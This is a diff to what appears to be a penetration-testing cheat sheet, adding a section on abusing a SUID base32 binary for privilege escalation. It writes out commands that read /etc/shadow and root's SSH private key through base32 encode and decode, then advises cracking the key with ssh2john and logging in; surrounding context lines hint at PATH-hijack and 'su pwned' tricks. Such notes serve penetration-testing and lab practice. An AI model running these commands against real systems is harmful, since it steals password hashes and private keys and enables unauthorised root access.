@@ -63,6 +63,19 @@ export PATH=/tmp:$PATH
 su pwned
 ```
 
+## SUID base32
+Total Quick win here, if you run SUID and find this:
+/usr/bin/base32
+Run these as a test
+
+```
+base32 /etc/shadow | base32 -d
+```
+```
+base32 /root/.ssh/id_rsa | base32 -d
+```
+Could be an easy win by getting the password or the id_rsa key; test with ssh2john, and if you get no password loaded. You can just sign in as normal. 
+
 ## linpeas
 
 ```
